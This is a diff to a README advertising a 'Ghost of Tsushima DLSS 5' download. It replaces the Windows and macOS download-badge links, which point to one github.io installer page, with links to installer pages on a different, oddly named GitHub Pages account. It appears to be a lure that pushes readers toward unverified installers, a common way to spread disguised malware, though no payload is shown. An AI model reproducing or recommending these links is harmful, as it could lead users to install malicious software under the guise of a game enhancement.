@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Ghost of Tsushima DLSS 5](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_GHOST_OF_TSUSHIMA_DLSS_5-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Ghost of Tsushima DLSS 5](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_GHOST_OF_TSUSHIMA_DLSS_5-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Ghost of Tsushima DLSS 5** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-C62828?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-C62828?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-C62828?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-C62828?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
 
 </div>
 
